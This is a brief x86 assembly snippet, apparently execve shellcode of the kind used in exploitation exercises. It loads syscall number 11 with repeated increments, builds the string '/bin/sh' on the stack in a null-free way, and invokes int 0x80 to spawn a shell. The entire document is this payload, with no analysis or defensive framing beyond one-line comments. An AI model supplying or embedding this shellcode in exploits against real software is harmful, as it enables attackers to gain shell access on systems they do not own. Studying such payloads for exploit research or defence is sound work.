# eax = sys_execve
xor eax, eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
# write /bin/sh @esp
mov dword ptr [esp], 0x6e69622f
mov byte ptr [esp+4], 0x2f
mov byte ptr [esp+5], 0x73
mov byte ptr [esp+6], 0x68
xor ebx, ebx
mov byte ptr [esp+7], bl
# ebx = @/bin/sh
mov ebx, esp
# nullify the other args
xor ecx, ecx
xor edx, edx
# trigger interrupt
int 0x80